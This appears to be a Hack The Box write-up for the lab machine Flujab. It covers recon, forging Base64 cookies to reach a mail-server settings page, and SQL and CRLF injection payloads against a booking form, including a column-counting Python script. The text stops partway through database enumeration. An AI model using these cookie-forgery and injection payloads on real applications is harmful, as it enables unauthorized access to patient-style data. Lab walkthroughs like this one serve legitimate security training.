![HTB Flujab (10.10.10.124)](./screenshots/flujab.jpg)

## PART 1 : Initial Recon

```console
nmap --min-rate 1000 -p- -v 10.10.10.124
```
```
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
8080/tcp open  http-proxy
```
```console
nmap -oN flujab.nmap -p22,80,443,8080 -sC -sV -v 10.10.10.124
```
```
PORT     STATE SERVICE  VERSION
22/tcp   open  ssh?
80/tcp   open  http     nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: ClownWare Proxy
|_http-title: Did not follow redirect to https://10.10.10.124/
443/tcp  open  ssl/http nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: ClownWare Proxy
|_http-title: Direct IP access not allowed | ClownWare
| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK
| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
| Issuer: commonName=ClownWare Certificate Authority/organizationName=ClownWare Ltd./stateOrProvinceName=LON/countryName=UK
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-11-28T14:57:03
| Not valid after:  2023-11-27T14:57:03
| MD5:   1f22 1ef7 c8bf d110 dfe6 2b6f 0765 2245
|_SHA-1: 7013 803a 92b3 f1f0 735d 404b 733c 712b bea6 ffcc
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
8080/tcp open  ssl/http nginx
| http-methods: 
|_  Supported Methods: GET HEAD POST
|_http-server-header: ClownWare Proxy
|_http-title: Direct IP access not allowed | ClownWare
| ssl-cert: Subject: commonName=ClownWare.htb/organizationName=ClownWare Ltd/stateOrProvinceName=LON/countryName=UK
| Subject Alternative Name: DNS:clownware.htb, DNS:sni147831.clownware.htb, DNS:*.clownware.htb, DNS:proxy.clownware.htb, DNS:console.flujab.htb, DNS:sys.flujab.htb, DNS:smtp.flujab.htb, DNS:vaccine4flu.htb, DNS:bestmedsupply.htb, DNS:custoomercare.megabank.htb, DNS:flowerzrus.htb, DNS:chocolateriver.htb, DNS:meetspinz.htb, DNS:rubberlove.htb, DNS:freeflujab.htb, DNS:flujab.htb
| Issuer: commonName=ClownWare Certificate Authority/organizationName=ClownWare Ltd./stateOrProvinceName=LON/countryName=UK
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2018-11-28T14:57:03
| Not valid after:  2023-11-27T14:57:03
| MD5:   1f22 1ef7 c8bf d110 dfe6 2b6f 0765 2245
|_SHA-1: 7013 803a 92b3 f1f0 735d 404b 733c 712b bea6 ffcc
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
| tls-nextprotoneg: 
|_  http/1.1
```
__NOTE(S)__:
- A couple of __DNS__ were captured by `nmap`
---

## PART 2 : Port Enumeration

1. Add the domain names to __/etc/hosts__:
   ```
   127.0.0.1       localhost
   127.0.1.1       kali f
   10.10.10.124    clownware.htb              ///DEAD END
   10.10.10.124    sni147831.clownware.htb    ///DEAD END
   10.10.10.124    *.clownware.htb            ///DEAD END
   10.10.10.124    proxy.clownware.htb        ///DEAD END
   10.10.10.124    console.flujab.htb         ///DEAD END
   10.10.10.124    sys.flujab.htb             ///DEAD END
   10.10.10.124    smtp.flujab.htb            
   10.10.10.124    vaccine4flu.htb            ///DEAD END
   10.10.10.124    bestmedsupply.htb          ///DEAD END 
   10.10.10.124    custoomercare.megabank.htb 
   10.10.10.124    flowerzrus.htb             ///DEAD END
   10.10.10.124    chocolateriver.htb         ///DEAD END
   10.10.10.124    meetspinz.htb              ///DEAD END
   10.10.10.124    rubberlove.htb             ///DEAD END 
   10.10.10.124    freeflujab.htb
   10.10.10.124    flujab.htb                 ///DEAD END

   # The following lines are desirable for IPv6 capable hosts
   ::1     localhost ip6-localhost ip6-loopback
   ff02::1 ip6-allnodes
   ff02::2 ip6-allrouters
   ```
   __NOTE(S)__:
   - Most of the domains contain either an embedded image or video
   - __bestmedsupply.htb__ and __flowerzrus.htb__ only contains static __*.html*__ pages

2. Visit https://custoomercare.megabank.htb
   - Landing Page:
     
     ![custoomercare.megabank.htb](./screenshots/443_custoomercare_megabank.png)

     __NOTE(S)__:
     - `The site ahead may contain harmful programs`

   1. Run `gobuster`:
      ```console
      gobuster -k -u https://custoomercare.megabank.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php
      ```
      ```
      [-] Wildcard response found: https://custoomercare.megabank.htb/48a44669-2c2f-4568-ac60-9d92eb6396db => 301
      ```
      __NOTE(S)__:
      - All `404` requests are redirected (`301`) to https://clownware.htb/cwerror_pages.php
      - The error page:

        ![cwerror](./screenshots/443_cwerror.gif)

   2. Run `gobuster` but limit to `200` responses:
      ```console
      gobuster -k -s 200 -u https://custoomercare.megabank.htb -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x php
      ```
      ```
      /index.php (Status: 200)
      /shell.php (Status: 200)
      ```

   3. Visit https://custoomercare.megabank.htb/shell.php:
      - Page Source:
        ```html
        <!--
        53cret 5shell
        shell.php?cmd=[commands]
        -->
        ```
      __NOTE(S)__:
      - The webpage seems to accept shell commands

   4. Pass commands:
      - `?cmd=id` returns `uid=0(root) gid=0(root) groups=0(root)`
      - `?cmd=ls` returns `root.txt`
      - `?cmd=cat root.txt` returns:
         
         ![Megabank Shell](./screenshots/443_megabank_shell.png)

      __NOTE(S)__:
      - The webpage is just a troll
      

3. Visit https://smtp.flujab.htb/
   - Landing Page:
   
     ![smtp.flujab.htb](./screenshots/443_smtp_flujab.png)
 
   - Page Source:
     ```html
     ...

             <!-- Header -->
             <section id="header" class="wrapper style3">
      
                 <!-- Logo -->
                 <div id="logo">
                     <h1><a href="/?login">SMTP Mail Configuration</a></h1>
                     </br>
                     <!-- NOW DEPRICATED! This function has been integrated into the new free service application!-->
                 </div>
             </section>
    
     ...

         <h2>Log in here for your Mail-in-a-Box control panel.</h2>
         <form class="form-horizontal" role="form" onsubmit="do_login(); return false;">

     ...
     ```
     __NOTE(S)__:
     - The "free service application" might be referring to __freeflujab.htb__

   - __do_login()__ function:
     ```js
     function do_login() {
       if ($('#loginEmail').val() == "") {
         show_modal_error("Login Failed", "Enter your email address.", function() {
    	 $('#loginEmail').focus();
         });
         return false;
       }
       if ($('#loginPassword').val() == "") {
         show_modal_error("Login Failed", "Enter your email password.", function() {
             $('#loginPassword').focus();
         });
         return false;
       }
       // Exchange the email address & password for an API key.
       api_credentials = [$('#loginEmail').val(), $('#loginPassword').val()]
       api(
       "/me",
       "GET",
       { },
       function(response){ 
         // This API call always succeeds. It returns a JSON object indicating
         // whether the request was authenticated or not.
         if (response.status != "ok") {
           // Show why the login failed.
           show_modal_error("Login Failed", response.reason)
           // Reset any saved credentials.
           do_logout();
         } else if (!("api_key" in response)) {
           // Login succeeded but user might not be authorized!
           show_modal_error("Login Failed", "You are not an administrator on this system.")
           // Reset any saved credentials.
           do_logout();
         } else {
           // Login succeeded.
           // Save the new credentials.
           api_credentials = [response.email, response.api_key];
           // Try to wipe the username/password information.
           $('#loginEmail').val('');
           $('#loginPassword').val('');
           // Remember the credentials.
           if (typeof localStorage != 'undefined' && typeof sessionStorage != 'undefined') {
             if ($('#loginRemember').val()) {
               localStorage.setItem("miab-cp-credentials", api_credentials.join(":"));
               sessionStorage.removeItem("miab-cp-credentials");
             } else {
               localStorage.removeItem("miab-cp-credentials");
               sessionStorage.setItem("miab-cp-credentials", api_credentials.join(":"));
             }
           }
           // Open the next panel the user wants to go to. Do this after the XHR response
           // is over so that we don't start a new XHR request while this one is finishing,
           // which confuses the loading indicator.
           setTimeout(function() { show_panel(!switch_back_to_panel || switch_back_to_panel == "login" ? 'system_status' : switch_back_to_panel) }, 300);
         }
       })
     }
     ```
     __NOTE(S)__:
     - __api()__ is not defined anywhere
     - The login functionality might be a __RABBIT HOLE__

4. Visit https://freeflujab.htb/
   - Landing Page:   

     ![freeflujab.htb](./screenshots/443_freeflujab.png)

     __NOTE(S)__:
     - __*/?cancel*__ redirects to __*/?ERROR=NOT_REGISTERED*__
     - __*/?remind*__ redirects to __*/?ERROR=NOT_REGISTERED*__
     - The other links seem to work fine

   - view-source:https://freeflujab.htb/favicon.ico
     ```php
     <?php 
     define('SafeIncludes', TRUE);
     require_once('includes/get_host.php');
     //                                                                                              /$$              
     include('includes/tokens.php');//                                                               | $$              
     //   /$$$$$$$  /$$$$$$  /$$   /$$  /$$$$$$   /$$$$$$$  /$$$$$$         /$$$$$$$  /$$$$$$   /$$$$$$$  /$$$$$$     
     //  /$$_____/ /$$__  $$| $$  | $$ /$$__  $$ /$$_____/ /$$__  $$       /$$_____/ /$$__  $$ /$$__  $$ /$$__  $$    
     // |  $$$$$$ | $$  \ $$| $$  | $$| $$  \__/| $$      | $$$$$$$$      | $$      | $$  \ $$| $$  | $$| $$$$$$$$    
     //  \____  $$| $$  | $$| $$  | $$| $$      | $$      | $$_____/      | $$      | $$  | $$| $$  | $$| $$_____/    
     //  /$$$$$$$/|  $$$$$$/|  $$$$$$/| $$      |  $$$$$$$|  $$$$$$$      |  $$$$$$$|  $$$$$$/|  $$$$$$$|  $$$$$$$    
     // |_______/  \______/  \______/ |__/       \_______/ \_______/       \_______/ \______/  \_______/ \_______/    
     include('includes/actions.php');                                                                                                              
     //                                                                                                    /$$ /$$ /$$
     include('includes/header.php');//                                                                    | $$| $$| $$
     //                    /$$   /$$  /$$$$$$  /$$   /$$ /$$   /$$ /$$   /$$ /$$   /$$  /$$$$$$   /$$$$$$ | $$| $$| $$
     //                   | $$  | $$ |____  $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$ /$$__  $$ /$$__  $$| $$| $$| $$
     //                   | $$  | $$  /$$$$$$$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$$$$$$$| $$$$$$$$|__/|__/|__/
     //                   | $$  | $$ /$$__  $$| $$  | $$| $$  | $$| $$  | $$| $$  | $$| $$_____/| $$_____/            
     //                   |  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$|  $$$$$$$ /$$ /$$ /$$
     //                    \____  $$ \_______/ \____  $$ \____  $$ \____  $$ \____  $$ \_______/ \_______/|__/|__/|__/
     //                    /$$  | $$           /$$  | $$ /$$  | $$ /$$  | $$ /$$  | $$                                
     //                   |  $$$$$$/          |  $$$$$$/|  $$$$$$/|  $$$$$$/|  $$$$$$/                                
     //                    \______/            \______/  \______/  \______/  \______/                                 
     include('includes/scripts.php');
     //                                                  ▄▄▄▄▄▄▄▄▄▄▄        
     //                                             ▄▄▀▀▀▀          ▀▀▄▄    
     //                                           ▄▀                   ▀▀▄    
     //                                          █                        █
     //                                         █                     ▄▀▀▀▀▀█▄
     //                                        █▀                    █    ▄███
     //                                        █                     █    ▀███
     //                                        █     ▄▀▀██▀▄         █       █
     //                                        █    █  ████ █         ▀▄▄▄▄▄█ 
     //                                        █    █  ▀██▀ █               █
     //                                        █    █       █              ▄▀
     //                                        █    ▀▄     ▄▀  ▄▄▄▄▄▄▄▄▄   █  
     //                                        █     ▀▀▀▀▀    █  ▀  ▀  █  ▄▀ 
     //                                         █              ▀▄█▄█▄█▀ ▄▀
     //                                          █                     ▄▀    
     include('includes/path_handler.php');//      ▀▀▀▄          ▄▄▄▄▄▄▀▀
     //                                            ▄▀         ▀▀  ▄▀ 
     //                                          ▄▀               █
     //                                         ▄▀                █  ▄▀▀▀█▀▀▄
     //                                         █    █  █▀▀▀▄     █▀▀    █  █
     //                                        ▄█    ▀▀▀    █     █    ▀▀   █
     //                                        █▀▄          █      █▄       █
     //                                        █  ▀▀▀▀▀█▄▄▄▄▀       ▀█▀▀▀▄▄▄▀
     //                                        █                     █
     //                                        █                     █
     //                                        █                     █
     //                                         █         ▀▄  ▄▀    █
     //                                          █          █        ▀▄
     //                                           █         █          █
     //                                           █         █           ▀▄
     //                                           █      ▄▀▀█▀▀▄        ▄▀▀██▀▄ 
     //                                           █             █▀▄            █
     //                                           ▀▀▀▀▀▀▀▀▀▀▀▀▀▀▀  ▀ ▀▀▀▀▀▀▀▀▀▀▀
     include('includes/fortune.php');
     ?>
     ```
     __NOTE(S__:
     - The favicon.ico is __not__ an image
     - The content looks like the page structure of the site

   - Site Cookies:
     - Request:
       ```http
       Cookie: Patient=daf23866abcb8e29ecee6d3da0caa992; Registered=ZGFmMjM4NjZhYmNiOGUyOWVjZWU2ZDNkYTBjYWE5OTI9TnVsbA%3D%3D
       ```
       __NOTE(S)__:
       - Decoded (Base64) `Registered` cookie: __daf23866abcb8e29ecee6d3da0caa992=Null__
       - It seems connected to the `Patient` cookie
     - Response:
       ```http
       Set-Cookie: Modus=Q29uZmlndXJlPU51bGw%3D; expires=Mon, ..-May-2019 ..:..:.. GMT; Max-Age=3600; path=/?smtp_config
       ```
       __NOTE(S)__:
       - Decoded (Base64) `Modus` cookie: __Configure=Null__
       - The path (__/?smtp_config__) for the `Modus` cookie seems to be the one referenced by https://smtp.flujab.htb
       - `Modus`, `Patient`, and `Registered` are set in the response if not requested
   
   - Accessing __*/?smtp_config*__:
     ```console
     curl -I -k https://freeflujab.htb/?smtp_config
     ```
     ```http
     HTTP/1.1 302 Found
     Date: ..., .. May 2019 ..:..:.. GMT
     Content-Type: text/html; charset=UTF-8
     Connection: keep-alive
     Set-Cookie: Modus=Q29uZmlndXJlPU51bGw%3D; expires=..., ..-May-2019 ..:..:.. GMT; Max-Age=3600; path=/?smtp_config
     Set-Cookie: Patient=daf23866abcb8e29ecee6d3da0caa992; expires=..., ..-May-2019 ..:..:.. GMT; Max-Age=3600; path=/
     Set-Cookie: Registered=ZGFmMjM4NjZhYmNiOGUyOWVjZWU2ZDNkYTBjYWE5OTI9VHJ1ZQ%3D%3D; expires=..., ..-May-2019 ..:..:.. GMT; Max-Age=3600; path=/
     Location: /?denied
     Server: ClownWare Proxy
     ```
     __NOTE(S)__:
     - The page redirects to __/?denied__
     - Maybe the cookie needs to be set correctly to access the page

   - Accessing __*/?book*__:
     - Booking Form:
       
       ![Booking Form](./screenshots/443_freeflujab_booking_form.png)

     - Page Source:
       ```html
       ...
       <form method="post" action="?book">
         <div class="row aln-center">
           <div class="col-6 col-12-medium">
             <b>Book Your Appointment Today!</b>
             <br><br>
             <p>If rou are an existing patient registered with our surgery, 
             we’re here to keep you and your loved ones as healthy as possible, 
             with expert advice on how to protect yourself from seasonal 
             illnesses and ailments, including flu.
             </p>
             <p>Even at our fittest and healthiest, we can still catch the 
             flu. For those over 65, people with a medical condition or
             pregnant women, catching flu can be more serious and that’s
             why we are here to offer a FREE NHS funded flu vaccine.
             </p>
             Cricklestone Doctors Surgery<br>
             NHS England.
             <p></p>
           </div>
           <div class="col-6 col-12-small">
             <h2>Prefered Date: <input type="date" name="date" value="2018-11-30" min="2018-10-01" max="2019-03-31"><br><br>
             Prefered Time: <input type="time" name="time" value="09:00" min"09:00"="" max="16:45"></h2><br>
             <input type="text" name="fname" id="contact-name" placeholder="Patient First Name" required=""><br>
             <input type="text" name="lname" id="contact-name" placeholder="Patient Last Name" required=""><br>
             <input type="text" name="nhsnum" placeholder="NHS Number (if known)" pattern="NHS-\d{3}-\d{3}-\d{4}" title=" A Valid NHS Number Is Required e.g. NHS-012-345-6789"><br>
             <ul class="actions"><br>                            
               <center><input type="submit" class="style1" value="Request Appointment" name="submit"></center>
             </ul>
           </div>
         </div>
       </form>
       ...
       ```
     - HTML Response after booking:
       ```
       date=2018-11-30
       time=09:00
       fname=jebidiah
       lname=anthony
       nhsnum=	
       submit=Request+Appointment   
       ```
       ```html
       ...
       <script>
         alert("Sorry, jebidiah anthony is not a registered patient!");
       </script>
       ...
       ```
     __NOTE(S)__:
     - The form requires a registered patient
     - `nhsnum` is not a required field

   - view-source:https://freeflujab.htb/?info
     ```html
     ...
     <h2>What people say about us</h2></br>
     <p>
       <i>"My boss would fire me if i missed a day of work, or couldn't do overtime when he needs me to. The online booking system made things so easy for me to range my flu jab."</i>
       <h3><i>A. Chun</i></h3>
     </p>
     <p>
       <i>"I normally hate injections, but the warm friendly atmosphere provided by the wonderful NHS staff helped dissolve all of my fears."</i>
       <h3><i>B. Smith</i></h3>
     </p>
     <p>
       <i>"Having a flu jab was as easy as pie.. pizza pie"</i>
       <h3><i>L. Feggola</i></h3>
     </p>
     <p>
       <i>"It so quick and painless, not to mention thousands of times safer than crossing the street!"</i>
       <h3><i>J. Walker</i></h3>
     </p>
     ...
     ```
     __NOTE(S)__:
     - A section of the page is dedicated to patient feedbacks
     - The feedbacks cited contain an initial and a surname
     - Educated guesses for a registered patient:
       - __Johnnie Walker__
       - __Johny Walker__
       - __John Walker__
       - __Jay Walker__

   - Re-book an appointment using educated guesses for a registered patient:
     ```
     date=2018-11-30
     time=09:00
     fname=john
     lname=walker
     nhsnum=	
     submit=Request+Appointment   
     ```
     - HTML Response:
       ```html
       ...
       <script>
         alert("Error! Could not connect to a mailserver at :25!");
       </script>
       ...
       ```
     - Response Cookies:
       ```http
       Set-Cookie: Modus=Q29uZmlndXJlPU51bGw%3D; expires=..., ..-May-2019 ..:..:.. GMT; Max-Age=3600; path=/?smtp_config
       Set-Cookie: Registered=ZGFmMjM4NjZhYmNiOGUyOWVjZWU2ZDNkYTBjYWE5OTI9VHJ1ZQ%3D%3D; expires=..., ..-May-2019 ..:..:.. GMT; Max-Age=0; path=/
       ```
     __NOTE(S)__:
     - __John Walker__ is a registered patient
     - Decoded (Base64) `Registered` cookie: __daf23866abcb8e29ecee6d3da0caa992=True__
       - The `Registered` cookie is now set to __True__
     - What if the `Modus` cookie is also set to __True__
       - Encoded (Base64) "__*Configure=True*__" : __Q29uZmlndXJlPVRydWU=__
       - URL Encoded cookie: __Modus=Q29uZmlndXJlPVRydWU%3D__
     - __"mailserver"__ could be another reference to an SMTP service
       - __":25"__ could be the port but the __*server address*__ has not yet been set

   - Accessing __*/?smtp_config*__ with the properly set cookies:
     ```sh
     cookie="Modus=Q29uZmlndXJlPVRydWU%3D;Patient=daf23866abcb8e29ecee6d3da0caa992;Registered=ZGFmMjM4NjZhYmNiOGUyOWVjZWU2ZDNkYTBjYWE5OTI9VHJ1ZQ%3D%3D;"
     
     curl --cookie $cookie -I -k https://freeflujab.htb/?smtp_config
     ```
     ```http
     HTTP/1.1 200 OK
     Date: ..., .. May 2019 ..:..:.. GMT
     Content-Type: text/html; charset=UTF-8
     Connection: keep-alive
     Server: ClownWare Proxy
     ```
     ```sh
     curl --cookie $cookie -k https://freeflujab.htb/?smtp_config
     ```
     ```html
     ...
     <div class="title">Mailer Configuration</div>
       <div class="container">
         <header class="style1">
           <h2>Patient Emailer Configuration Settings</h2>
           <h2>Current Setting = SMTP: :25</h2>
         </header>
         <!-- Contact Form -->
         <section>
           <form method="post" action="?smtp_config">
             <div class="row aln-center">
               <div class="col-6 ">
                 <input type="text" name="mailserver" id="email-server" value="smtp.flujab.htb" pattern="smtp.[A-Za-z]{1,255}.[A-Za-z]{2,5}" title=" A Valid SMTP Domain Address Is Required"/>
                 <input type="hidden" name="port" id="port" placeholder="25" value="25" />
               </div>
               <div class="col-12">
                 <p>
                   WARNING: Only <a href="/?whitelist">whitelisted sysadmins</a> are authorized to 
                   access this page! <br \> If you are not supposed to 
                   change these settings then don't! whitelist will be 
                   auto-updated.
                 </p>
                 <ul class="actions">
                   <li><input type="submit" class="style1" value="Save Mail Server Config" name="save" /></li>
                 </ul>
               </div>
             </div>
           </form>
         </section>
       </div>
     </div>
     ...
     ```
     __NOTE(S)__:
     - The `mailserver` parameter only accepts a certain pattern
       - It could be bypassed by changing the input __*value*__ to anything you want
       - It could also be bypassed by intercepting the request and changing the values there
   
   - Set the __*mailserver*__ to be you local IP address:
     ```sh
     data="mailserver=10.10.15.10&port=25&save=Save+Mail+Server+Config"

     curl -b $cookie -d $data -k https://freeflujab.htb/?smtp_config
     ```
     ```html
     ...
     <h2>Patient Emailer Configuration Settings</h2>
     <h2>Current Setting = SMTP: 10.10.15.10:25</h2>
     ...
     ```

   - Explore the __SMTP__ service:
     1. Set-up an SMTP server locally:
        ```console
        python -m smtpd -c DebuggingServer -n 10.10.15.10:25
        ```
        - From the [Python smtpd documentation](https://docs.python.org/3/library/smtpd.html):
          ```
          DebuggingServer Objects

          class smtpd.DebuggingServer(localaddr, remoteaddr)

          Create a new debugging server. Arguments are as per SMTPServer. Messages will be discarded, and printed on stdout.
          ```
     2. Book an appointment then check the __*mailserver*__:
        ```sh
        data="date=2018-11-30&time=09:00&fname=john&lname=walker&nhsnum=&submit=Request+Appointment"

        curl -b $cookie -d $data -k https://freeflujab.htb/?book
        ```
        - mailserver:
          ```smtp
          ---------- MESSAGE FOLLOWS ----------
          Date: ..., .. May 2019 ..:..:.. +0100
          To: jwalker@tuta.io
          From: Nurse Julie <DutyNurse@flujab.htb>
          Subject: Flu Jab Appointment - Ref:NHS-921-376-3922
          Message-ID: <6c7e8490856eef3377e672b3684e342b@freeflujab.htb>
          X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
          MIME-Version: 1.0
          Content-Type: text/plain; charset=iso-8859-1
          X-Peer: 10.10.10.124

            Dear Mr john walker,

            Here are the details of your appointment at our surgery.
            ________________________

              VACCINATION
              Routine Priority
              ------------------    
              REF    : NHS-921-376-3922 
              Code   : Influ-022
              Type   : Injection
              Time   : 09:00
              Date   : 2018-11-30
              LOC    : Crick026 
            ________________________

            We look forward to seeing you.
            Have a nice day,

            Nurse Julie Walters
            Senior Staff Nurse
            Cricklestone Doctors Surgery
            NHS England.

          ------------ END MESSAGE ------------
          ```
        __NOTE(S)__:
        - The `nhsnum` parameter was left empty during the request
        - An __NHS Number__ was supplied in the email

     3. Request a reminder for the appointment then check the __*mailserver*__:
        ```sh
        data="nhsnum=NHS-921-376-3922&submit=Send+Reminder"

        curl -b $cookie -d $data -k https://freeflujab.htb/?remind
        ```
        ```html
        ...
        <script>alert("Email Error: You must provide at least one recipient email address.");</script>
        ...
        ```
        ```sh
        data="nhsnum=NHS-921-376-3922&submit=Send+Reminder&email=DutyNurse@flujab.htb"

        curl -b $cookie -d $data -k https://freeflujab.htb/?remind
        ```
        - mailserver:
          ```smtp
          ---------- MESSAGE FOLLOWS ----------
          Date: ..., .. May 2019 ..:..:.. +0100
          To: DutyNurse@flujab.htb
          From: Nurse Julie <DutyNurse@flujab.htb>
          Subject: Flu Jab Appointment - Ref:NHS-921-376-3922
          Message-ID: <64c2cbafd6e671ec34e3803202871fdc@freeflujab.htb>
          X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
          MIME-Version: 1.0
          Content-Type: text/plain; charset=iso-8859-1
          X-Peer: 10.10.10.124

            Dear Mr john walker,

            Here are the details of your appointment at our surgery.
            ________________________

              VACCINATION
              Routine Priority
              ------------------    
              REF    : NHS-921-376-3922    
              Code   : Influ-022
              Type   : Injection
              Stat   : CANCELED 
              LOC    : Crick026
            ________________________

            We look forward to seeing you.
            Have a nice day,

            Nurse Julie Walters
            Senior Staff Nurse
            Cricklestone Doctors Surgery
            NHS England.

          ------------ END MESSAGE ------------
          ```
        __NOTE(S)__:
        - Supplying an `email` parameter sends a reminder over __*SMTP*__
        - Asking for a reminder cancels an appointment
          - Maybe something's up with this page...

     4. Test the `nhsnum` parameter for "Injection":
        - TEST #1 -- Fuzzing:
          ```sh
          data="nhsnum=test&submit=Send+Reminder&email=DutyNurse@flujab.htb"

          curl -b $cookie -d $data -k https://freeflujab.htb/?remind
          ```
          ```smtp
          ---------- MESSAGE FOLLOWS ----------
          Date: ..., .. May 2019 ..:..:.. +0100
          To: DutyNurse@flujab.htb
          From: Nurse Julie <DutyNurse@flujab.htb>
          Subject: Flu Jab Appointment - Ref:
          Message-ID: <655bc8a49b3bdd6acc1dae82abdec5fb@freeflujab.htb>
          X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
          MIME-Version: 1.0
          Content-Type: text/plain; charset=iso-8859-1
          X-Peer: 10.10.10.124

            Dear Mr john walker,

            Here are the details of your appointment at our surgery.
            ________________________

              VACCINATION
              Routine Priority
              ------------------    
              REF    : test    
              Code   : Influ-022
              Type   : Injection
              Stat   : CANCELED 
              LOC    : Crick026
            ________________________

            We look forward to seeing you.
            Have a nice day,

            Nurse Julie Walters
            Senior Staff Nurse
            Cricklestone Doctors Surgery
            NHS England.

          ------------ END MESSAGE ------------          
          ```
          __NOTE(S)__:
          - The `Subject` header changed: `Subject: Flu Jab Appointment - Ref:`
          - The `REF` changed: `REF    : test`

        - TEST #2 -- SMTP Header Injection using CRLF:
          ```sh
          data="nhsnum=NHS-921-376-3922%0d%0aSubject:%20test&submit=Send+Reminder&email=DutyNurse@flujab.htb"

          curl -b $cookie -d $data -k https://freeflujab.htb/?remind
          ```
          ```smtp
          ---------- MESSAGE FOLLOWS ----------
          Date: ..., .. May 2019 ..:..:.. +0100
          To: DutyNurse@flujab.htb
          From: Nurse Julie <DutyNurse@flujab.htb>
          Subject: Flu Jab Appointment - Ref:
          Message-ID: <c9fb2cef453e9a4ca88691ad507d6af1@freeflujab.htb>
          X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
          MIME-Version: 1.0
          Content-Type: text/plain; charset=iso-8859-1
          X-Peer: 10.10.10.124

            Dear Mr john walker,

            Here are the details of your appointment at our surgery.
            ________________________

              VACCINATION
              Routine Priority
              ------------------    
              REF    : NHS-921-376-3922
          Subject: test    
              Code   : Influ-022
              Type   : Injection
              Stat   : CANCELED 
              LOC    : Crick026
            ________________________

            We look forward to seeing you.
            Have a nice day,

            Nurse Julie Walters
            Senior Staff Nurse
            Cricklestone Doctors Surgery
            NHS England.

          ------------ END MESSAGE ------------          
          ```        
          __NOTE(S)__:
          - The `Ref:` at the `Subject` header still remains empty
          - `\r\n` was only passed in `REF`
        
        - TEST #3 -- SQL Injection:
          ```sh 
          data="nhsnum='+OR+'1'='1&submit=Send+Reminder&email=DutyNurse@flujab.htb"

          curl -b $cookie -d $data -k https://freeflujab.htb/?remind
          ```
          ```smtp
          ---------- MESSAGE FOLLOWS ----------
          Date: ..., .. May 2019 ..:..:.. +0100
          To: DutyNurse@flujab.htb
          From: Nurse Julie <DutyNurse@flujab.htb>
          Subject: Flu Jab Appointment - Ref:NHS-943-475-5911
          Message-ID: <086a0e84f07f82f4e4f384a78f8dd9ac@freeflujab.htb>
          X-Mailer: PHPMailer 5.2.22 (https://github.com/PHPMailer/PHPMailer)
          MIME-Version: 1.0
          Content-Type: text/plain; charset=iso-8859-1
          X-Peer: 10.10.10.124

            Dear Mr john walker,

            Here are the details of your appointment at our surgery.
            ________________________

              VACCINATION
              Routine Priority
              ------------------    
              REF    : ' OR '1'='1    
              Code   : Influ-022
              Type   : Injection
              Stat   : CANCELED 
              LOC    : Crick026
            ________________________

            We look forward to seeing you.
            Have a nice day,

            Nurse Julie Walters
            Senior Staff Nurse
            Cricklestone Doctors Surgery
            NHS England.

          ------------ END MESSAGE ------------          
          ```
          __NOTE(S)__:
          - `Ref:NHS-943-475-5911` appears in the `Subject` header
            - It's different from the initial queries (`Ref:NHS-921-376-3922`)
          - The server is vulnerable to __SQL injection__
     
     5. Exploit the vulnerability in the `nhsnum` parameter: 
        1. Check what database the service is using:
           ```sql
           ' OR sqlite_version()=sqlite_version() #
           ```
           __NOTE(S)__:
           - No message goes through the server
        
           ```sql
           ' OR crc32('MySQL')=crc32('MySQL') #
           ```
           __NOTE(S)__:
           - It returns a successful query
             - `Subject: Flu Jab Appointment - Ref:NHS-943-475-5911`
           - The service is using __MySQL__
             - SQLite will use `sqlite_master` to enumerate database content
             - MySQL will use `information_schema` to enumerate database content 
        
        2. Check how many columns are in the original query:
           ```py
           import requests as r

           target = "https://freeflujab.htb/?remind"

           cookies = {
               "Modus": "Q29uZmlndXJlPVRydWU%3D",
               "Patient": "daf23866abcb8e29ecee6d3da0caa992",
               "Registered":  "ZGFmMjM4NjZhYmNiOGUyOWVjZWU2ZDNkYTBjYWE5OTI9VHJ1ZQ%3D%3D"
           }

           query_columns = 1
           while True:

           data = {
               "nhsnum": "' OR '1'='1' ORDER BY %d #" % (query_columns + 1),
               "submit": "Send Reminder",
               "email": "DutyNurse@flujab.htb"
           }

           req = r.post(target, allow_redirects=False, cookies=cookies, data=data, timeout=1000, verify=False)

           if data["email"] not in req.text: break
           else: query_columns += 1

           print("THE ORIGINAL QUERY HAS %d COLUMNS" % (query_columns))
           ```
           ```
           THE ORIGINAL QUERY HAS 5 COLUMNS
           ```
           __NOTE(S)__:
           - This needs to be done to be able to use `UNION` during injection

        3. Check which column leaks information during query:
           ```sql 
           ' AND '1'='1' UNION SELECT 'one','two','three','four','five' #
           ```
           ```
           ...
           Subject: Flu Jab Appointment - Ref:three
           ...
           ```
           __NOTE(S)__:
           - The third column is output to the `Subject` header
        
        4. Enumerate the service:
           ```sql 
           ' AND '1'='1' UNION SELECT 1,2,@@version,4,5 #
           ```
           ```
           ...
           Subject: Flu Jab Appointment - Ref:10.1.37-MariaDB-0+deb9u1
           ...
           ``` 
           ```sql 
